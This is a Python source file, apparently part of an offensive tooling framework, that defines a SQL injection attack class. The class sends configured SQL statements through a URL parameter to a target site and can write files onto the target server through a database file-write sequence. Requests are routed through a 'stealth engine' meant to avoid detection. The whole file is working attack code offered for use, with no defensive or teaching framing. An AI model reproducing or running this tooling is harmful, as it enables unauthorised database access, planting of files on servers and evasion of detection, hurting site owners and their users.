import logging
import urllib.request
import urllib.parse
import binascii

from .attack import Attack, AttackException
from .database import Database

log = logging.getLogger(__name__)

class SQLInjection(Attack):

    name = 'sqlinjection'

    def __init__(self, config, stealth_engine):
        super(SQLInjection, self).__init__()
        self.config = config
        self._confirm_config()
        self._se = stealth_engine

    def doAttack(self):
        c = self.config
        if 'statements' in c:
            log.debug('injecting {} statements'.format(len(c['statements'])))
            self._se.execute_sequence(self._injection, c['statements'])
        
        if 'file_write' in c:
            self._file_write(c)

    def _file_write(self, c):
        if not 'file_dest' in c:
            raise AttackException('Missing "file_dest" when given "file_write" in configuration.')

        statements = Database().filewrite_sequence(c['database'], c['file_write'], c['file_dest'])
        self._se.execute_sequence(self._injection, statements)

    def _injection(self, sql):
        c = self.config
        params = urllib.parse.urlencode({c['attribute']: sql})
        url = '{}?{}'.format(c['base_url'], params)
        log.debug('Getting {}'.format(url))
        log.info('Running {}'.format(sql))
        
        with urllib.request.urlopen(url) as f:
            response = f.read()
            log.info('Read {} bytes in response.'.format(len(response)))
            # print(response)

    def _confirm_config(self):
        required = ['base_url', 'attribute']
        if not set(required).issubset(self.config.keys()):
            missing = ', '.join([s for s in set(required).difference(set(self.config.keys()))])
            raise AttackException('Missing required config for {} attack: {}'.format(
                SQLInjection.name, missing))

        if 'statements' not in self.config and not 'file_write' in self.config:
            raise AttackException('Missing required config for {} attack: injection or file_write.'.format(
                SQLInjection.name))


        return True
